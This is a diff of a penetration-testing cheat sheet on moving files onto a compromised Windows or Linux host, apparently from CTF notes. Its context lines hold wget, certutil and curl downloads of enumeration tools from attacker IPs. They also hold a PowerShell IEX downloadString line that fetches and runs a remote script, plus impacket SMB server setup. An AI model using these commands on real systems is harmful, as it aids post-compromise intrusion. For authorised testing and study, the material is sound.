@@ -7,7 +7,6 @@ There are a few methods of transferring files, and the usage of each would depen
 When downloading files, make sure that we output the file in a **directory that we can write to**.\
 Possible directories include:
 
-{% code title="For Linux" %}
 ```bash
 /tmp
 /dev/shm
@@ -15,7 +14,6 @@ Possible directories include:
 /var/www/html/<whatever>
 # just check which directories we can write to using ls -la
 ```
-{% endcode %}
 
 ```bash
 C:\user\<compromised_user>\
@@ -36,14 +34,11 @@ python2 -m SimpleHTTPServer <port>
 
 Afterwards, depending on the OS, we can download the files over.
 
-{% code title="Linux to Linux" %}
 ```bash
 wget http://10.10.10.10/linpeas.sh -o linpeas.sh
 # -o is optional for Linux systems
 ```
-{% endcode %}
 
-{% code overflow="wrap" %}
 ```powershell
 certutil.exe -urlcache -split -f "http://10.10.10.10./winPEAS.exe" "C:\users\vulnerable\documents\winpeas.exe"
 
@@ -57,7 +52,6 @@ IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1', 
 # curl
 curl http://10.10.10.14/file -o C:\users\user\desktop\file
 ```
-{% endcode %}
 
 These are just some of the commands that we can use.
 
@@ -73,7 +67,6 @@ Server Message Block (SMB) can run on either Windows or Linux, and we can transf
 
 First, set up a smbserver on our Linux machine, which we can do with smbserver.py from the **impacket suite**.
 
-{% code overflow="wrap" %}
 ```bash
 smbserver.py <name of share> <directory to make a share> -smb2support
 # normally, i use 'share' as the name and '.' to signify the current working directory
@@ -81,7 +74,6 @@ smbserver.py <name of share> <directory to make a share> -smb2support
 smbserver.py -username guest -password guest share . -smb2support
 # sometimes, windows defender does not allow smb connections that do not have credentials.
 ```
-{% endcode %}
 
 {% embed url="https://github.com/SecureAuthCorp/impacket" %}
 
